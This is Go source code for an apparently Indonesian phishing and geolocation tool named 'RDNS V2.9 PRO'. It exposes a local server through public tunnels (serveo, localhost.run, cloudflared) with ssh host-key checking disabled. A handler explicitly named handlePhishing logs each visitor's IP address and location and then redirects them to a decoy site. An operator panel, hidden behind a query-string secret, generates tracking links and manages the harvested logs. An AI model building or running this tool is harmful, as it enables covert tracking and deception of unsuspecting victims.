package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
	"rdns_suite/tools"
)

const (
	dbGeo = "logs_geo.db"; dbMeta = "logs_meta.db"
	sessGeo = "session_geo.tmp"; sessMeta = "session_meta.tmp"
	custFile = "custom.txt"
	toolsDir = "./tools/"
)

var tunnelCmd *exec.Cmd

func getTunnelURL() string {
	data, err := os.ReadFile("tunnel.log")
	if err != nil { return "Menunggu link..." }
	logContent := string(data)
	lines := strings.Split(logContent, "\n")
	for _, line := range lines {
		if strings.Contains(line, "https://") {
			parts := strings.Split(line, " ")
			for _, p := range parts {
				if strings.HasPrefix(p, "https://") {
					return strings.TrimSpace(p)
				}
			}
		}
	}
	return "Generate link... (Klik Refresh)"
}

func startTunnel(provider string) {
	killTunnel()
	var cmdStr string
	switch provider {
	case "serveo":
		cmdStr = "ssh -o StrictHostKeyChecking=no -R 80:127.0.0.1:9090 serveo.net > tunnel.log 2>&1"
	case "localhost":
		cmdStr = "ssh -o StrictHostKeyChecking=no -R 80:127.0.0.1:9090 localhost.run > tunnel.log 2>&1"
	default: // cloudflare
		cmdStr = "cloudflared tunnel --url http://127.0.0.1:9090 > tunnel.log 2>&1"
	}
	tunnelCmd = exec.Command("sh", "-c", cmdStr)
	go tunnelCmd.Run()
}

func killTunnel() {
	if tunnelCmd != nil && tunnelCmd.Process != nil {
		tunnelCmd.Process.Kill()
	}
	os.Remove("tunnel.log")
}

func main() {
	os.MkdirAll(toolsDir, 0755)
	printBanner()

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		q := r.URL.Query()
		admin, tool, action := q.Get("admin"), q.Get("tool"), q.Get("action")

		if q.Get("v") != "" {
			handlePhishing(w, r, q.Get("l"))
			return
		}

		if admin == "rdns" {
			// Logic Baru: Kill & New Session
			if tool == "geolocate" {
				if action == "kill" {
					killTunnel()
					http.Redirect(w, r, "?admin=rdns&tool=geolocate", http.StatusFound)
					return
				}
				if action == "new_session" {
					os.Remove(sessGeo)
					http.Redirect(w, r, "?admin=rdns&tool=geolocate&exec=true", http.StatusFound)
					return
				}
			}

			if tool == "geolocate" && action == "launch" {
				if r.FormValue("custom_url") != "" {
					os.WriteFile(custFile, []byte(r.FormValue("custom_url")), 0644)
				}
				startTunnel(r.FormValue("provider"))
				http.Redirect(w, r, "?admin=rdns&tool=geolocate&exec=true", http.StatusFound)
				return
			}

			if tool == "archive" && action == "delete" {
				r.ParseForm()
				handleDelete(r.FormValue("log_type"), r.Form["del_item"])
				http.Redirect(w, r, "?admin=rdns&tool=archive", http.StatusFound)
				return
			}

			isMetaProc := false
			var metaData map[string]string
			if r.Method == "POST" && tool == "metadata" {
				file, head, err := r.FormFile("imagefile")
				if err == nil {
					defer file.Close()
					isMetaProc = true
					metaData = map[string]string{"name": head.Filename, "size": fmt.Sprintf("%.2f KB", float64(head.Size)/1024.0)}
					out, _ := os.Create(toolsDir + "cleaned_image.jpg")
					io.Copy(out, file); out.Close()
					log := fmt.Sprintf("%s|%s|Stripped: %s\n", time.Now().Format("15:04:05"), r.RemoteAddr, head.Filename)
					f1, _ := os.OpenFile(dbMeta, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); f1.WriteString(log); f1.Close()
					f2, _ := os.OpenFile(sessMeta, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); f2.WriteString(log); f2.Close()
				}
			}

			renderHeader(w)
			switch tool {
			case "geolocate":
				if q.Get("exec") == "true" {
					data, _ := os.ReadFile(sessGeo)
					renderWorkbench(w, strings.Split(strings.TrimSpace(string(data)), "\n"), getTunnelURL())
				} else { renderGeoConfig(w) }
			case "metadata":
				data, _ := os.ReadFile(sessMeta)
				tools.RenderMetaStripper(w, "id", isMetaProc, metaData, strings.Split(strings.TrimSpace(string(data)), "\n"))
			case "specter":
				if q.Get("exec") == "true" { tools.RenderSpecter(w, r.FormValue("target"))
				} else { renderArticle(w) }
			case "archive":
				renderArchive(w)
			default:
				renderLobby(w)
			}
			fmt.Fprintf(w, "</div></body></html>")
			return
		}
		renderTarget(w)
	})

	fmt.Println("\033[32m[+] Server Master LIVE di http://127.0.0.1:9090\033[0m")
	http.ListenAndServe(":9090", nil)
}

func handlePhishing(w http.ResponseWriter, r *http.Request, loc string) {
	if loc == "" { loc = "WAITING" }
	log := fmt.Sprintf("%s|%s|%s\n", time.Now().Format("15:04:05"), r.RemoteAddr, loc)
	f1, _ := os.OpenFile(dbGeo, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); f1.WriteString(log); f1.Close()
	f2, _ := os.OpenFile(sessGeo, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); f2.WriteString(log); f2.Close()
	t, _ := os.ReadFile(custFile); url := strings.TrimSpace(string(t))
	if url == "" { url = "https://www.google.com" }
	http.Redirect(w, r, url, http.StatusFound)
}

func handleDelete(logType string, items []string) {
	targetFile := dbGeo; sessFile := sessGeo
	if logType == "meta" { targetFile = dbMeta; sessFile = sessMeta }
	data, _ := os.ReadFile(targetFile)
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	var newLines []string
	for _, line := range lines {
		keep := true
		for _, del := range items { if line == del { keep = false } }
		if keep && line != "" { newLines = append(newLines, line) }
	}
	os.WriteFile(targetFile, []byte(strings.Join(newLines, "\n")+"\n"), 0644)
	os.WriteFile(sessFile, []byte(strings.Join(newLines, "\n")+"\n"), 0644)
}

func printBanner() {
	fmt.Println("\033[35m" + `
    ____  ____  _   _ ____  
   |  _ \|  _ \| \ | / ___| 
   | |_) | | | |  \| \___ \ 
   |  _ <| |_| | |\  |___) |
   |_| \_\____/|_| \_|____/ V2.9 PRO` + "\033[0m")
}
